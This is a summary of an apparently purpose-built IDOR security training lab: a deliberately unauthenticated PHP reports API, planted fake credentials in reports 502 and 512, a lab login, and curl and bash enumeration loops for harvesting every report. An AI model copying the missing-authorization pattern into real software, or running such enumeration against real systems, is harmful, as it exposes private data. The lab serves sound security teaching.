# IDOR Lab - Reports Module Summary

## ✅ Implementation Complete

### What Was Built

#### 1. **Vulnerable Reports API** (`/api/reports.php`)
- Endpoints:
  - `GET /api/reports.php?page=X&limit=Y` - List reports (paginated)
  - `GET /api/reports.php?id=X` - Get specific report (IDOR vulnerability)
- **Vulnerability**: No authentication or authorization checks
- **Impact**: Anyone can access any report by guessing the ID

#### 2. **Reports React Component** (`/portal/src/views/Reports.js`)
- Professional UI with table view of reports
- Pagination support (20 reports per page)
- **"Direct Report Access"** feature with ID input field
- Modal popup for viewing full report content
- Visual indicators for confidential reports (red badge)
- Hints to users about sequential IDs (1-512)

#### 3. **Database Content** (512 Total Reports)
- Reports 1-500: Historical dummy reports (non-confidential)
- Reports 501-511: Detailed realistic reports (non-confidential)
- **Report 502**: 🔴 **CONFIDENTIAL** - Infrastructure credentials
- **Report 512**: 🔴 **CONFIDENTIAL** - Executive financial data

---

## 🎯 Attack Scenario

### Target Credentials in Report #502
```
Development Server: dev.mbti-internal.local
Username: admin
Password: Mb7i_D3v_2024!Secure
```

### Target Credentials in Report #512
```
Production Database: prod-db.mbti-internal.local
Username: db_admin
Password: Pr0d_DB_M8t1#2025!Secure
```

---

## 🔍 Exploitation Methods

### Method 1: UI-Based (Easiest)
1. Login to portal: `http://portal.mbti.local`
2. Navigate to **Reports** page
3. See "Direct Report Access" input
4. Enter report ID: **502** or **512**
5. Click **View** button
6. 🎉 Access granted to confidential report!

### Method 2: API-Based
```bash
# Direct API access (no authentication required!)
curl "http://portal.mbti.local/api/reports.php?id=502"
curl "http://portal.mbti.local/api/reports.php?id=512"
```

### Method 3: Automated Enumeration
```bash
# Download all reports
for i in {1..512}; do
  curl -s "http://portal.mbti.local/api/reports.php?id=$i" \
    -o "reports/report_$i.json"
done

# Extract confidential reports only
for i in {1..512}; do
  is_conf=$(curl -s "http://portal.mbti.local/api/reports.php?id=$i" | jq -r '.data.is_confidential')
  if [ "$is_conf" == "true" ]; then
    echo "Confidential report found: $i"
  fi
done
```

---

## 🔴 Security Issues

### 1. **No Authentication**
```php
// MISSING: Session validation
session_start();
require_once '../config.php';

// Should check:
// if (!isset($_SESSION['logged_in'])) { die('Unauthorized'); }
```

### 2. **No Authorization**
```php
// MISSING: Access control check
// Should verify:
// - Is user logged in?
// - Is user allowed to view this report?
// - Does user own this report?
// - Is user a manager?
```

### 3. **Predictable IDs**
- Sequential integers: 1, 2, 3, ..., 512
- Easy to enumerate all reports
- Should use UUIDs or non-sequential identifiers

### 4. **Information Disclosure**
- UI hints about ID range (1-512)
- Error messages reveal system information
- Confidential flag visible but not enforced

---

## 📊 Statistics

| Metric | Value |
|--------|-------|
| Total Reports | 512 |
| Non-Confidential | 510 |
| Confidential | 2 |
| Confidential IDs | 502, 512 |
| Leaked Passwords | 2 |
| Vulnerable Endpoints | 1 |
| Authorization Checks | 0 ❌ |

---

## 🎓 Learning Objectives

Students will learn:
- ✅ What is IDOR (Insecure Direct Object Reference)
- ✅ How to identify IDOR vulnerabilities
- ✅ How to exploit sequential ID parameters
- ✅ Impact of missing authorization checks
- ✅ How to enumerate resources
- ✅ Importance of proper access control

---

## 🛠️ Deployment Status

- [x] Vulnerable API created
- [x] Reports React component built
- [x] Database populated (512 reports)
- [x] Report #502 updated (Peter Schneider)
- [x] Report #512 added (Klaus Weber)
- [x] API deployed to container
- [x] React build deployed
- [x] UI icons updated
- [x] Documentation created

---

## 🧪 Testing Checklist

- [x] API returns list of reports
- [x] Pagination works correctly
- [x] Report #502 is confidential
- [x] Report #512 is confidential
- [x] Direct ID access works
- [x] No authentication required
- [x] Passwords visible in report content
- [x] UI displays confidential badge
- [x] Modal shows full report content

---

## 🚀 Access Instructions

1. **Portal URL**: `http://portal.mbti.local`
2. **Login**: MBTI2024837 / tekelomuxo
3. **Navigate**: Click "Reports" in sidebar
4. **Exploit**: Enter report ID 502 or 512
5. **Success**: View confidential credentials!

---

## 📝 Files Modified/Created

### Created Files:
- `/portal/api/reports.php` - Vulnerable API endpoint
- `/IDOR_VULNERABILITY.md` - Detailed vulnerability documentation
- `/REPORTS_SUMMARY.md` - This file

### Modified Files:
- `/portal/src/views/Reports.js` - Complete rewrite with IDOR UI
- `/portal/src/routes.js` - Updated icons (briefcase, badge, etc.)
- `/QUICKSTART.md` - Added reports hints
- Database: Updated report #502, added report #512

---

## 🎯 Success Metrics

The lab is successful if students can:
1. ✅ Navigate to Reports page
2. ✅ Discover the Direct Report Access feature
3. ✅ Guess or enumerate report IDs
4. ✅ Access confidential report #502
5. ✅ Extract the password: `Mb7i_D3v_2024!Secure`
6. ✅ Access confidential report #512
7. ✅ Extract the DB password: `Pr0d_DB_M8t1#2025!Secure`

---

**Lab Status**: ✅ **READY FOR USE**

The IDOR vulnerability is fully functional and ready for security training!
